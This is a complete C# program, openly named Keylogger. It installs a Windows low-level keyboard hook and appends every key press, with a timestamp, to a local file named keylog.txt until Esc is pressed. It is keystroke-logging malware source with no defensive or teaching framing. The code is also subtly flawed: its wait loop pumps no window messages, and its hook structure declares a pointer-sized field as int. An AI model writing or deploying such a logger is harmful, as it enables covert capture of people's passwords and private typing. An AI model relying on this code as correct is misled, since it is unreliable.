using System;
using System.IO;
using System.Text;
using System.Windows.Forms;
using System.Runtime.InteropServices;

public class Keylogger
{
    // Define constants for hook types and messages.
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    
    // Define the structure for the keyboard hook.
    private struct KBDLLHOOKSTRUCT
    {
        public int vkCode;
        public int scanCode;
        public int flags;
        public int time;
        public int dwExtraInfo;
    }
    
    // Import necessary user32.dll functions.
    [DllImport("user32.dll")]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hInstance, uint threadId);
    
    [DllImport("user32.dll")]
    private static extern bool UnhookWindowsHookEx(IntPtr hHook);
    
    [DllImport("user32.dll")]
    private static extern IntPtr CallNextHookEx(IntPtr hHook, int nCode, IntPtr wParam, ref KBDLLHOOKSTRUCT lParam);
    
    [DllImport("kernel32.dll")]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    // Define the delegate for the low-level keyboard hook.
    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, ref KBDLLHOOKSTRUCT lParam);

    // The hook handle.
    private static IntPtr _hookID = IntPtr.Zero;
    // Path for saving the log file.
    private static string logFilePath = "keylog.txt";

    // Main entry point of the program.
    public static void Main()
    {
        // Set up the keyboard hook.
        _hookID = SetHook(OnKeyboardEvent);

        Console.WriteLine("Keylogger started. Press 'Esc' to exit.");
        Console.WriteLine("Logging keystrokes to: " + logFilePath);

        // Wait for the user to press 'Esc' to stop the keylogger.
        while (!(Console.KeyAvailable && Console.ReadKey(true).Key == ConsoleKey.Escape))
        {
            // Sleep to prevent high CPU usage.
            System.Threading.Thread.Sleep(10);
        }

        // Unhook the keyboard event when finished.
        UnhookWindowsHookEx(_hookID);
        Console.WriteLine("Keylogger stopped.");
    }

    // Set up the hook and return the hook ID.
    private static IntPtr SetHook(LowLevelKeyboardProc proc)
    {
        using (var currentProcess = System.Diagnostics.Process.GetCurrentProcess())
        using (var currentModule = currentProcess.MainModule)
        {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(currentModule.ModuleName), 0);
        }
    }

    // The function to handle the keyboard event.
    private static IntPtr OnKeyboardEvent(int nCode, IntPtr wParam, ref KBDLLHOOKSTRUCT lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            // Get the key pressed.
            Keys key = (Keys)lParam.vkCode;
            LogKeyPress(key);
        }

        return CallNextHookEx(_hookID, nCode, wParam, ref lParam);
    }

    // Log the key press to a file.
    private static void LogKeyPress(Keys key)
    {
        try
        {
            // Open the file to append the keypress.
            using (StreamWriter sw = new StreamWriter(logFilePath, true))
            {
                // Log the key and the time of the keypress.
                sw.WriteLine($"{DateTime.Now:yyyy-MM-dd HH:mm:ss}: {key}");
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error logging key: " + ex.Message);
        }
    }
}
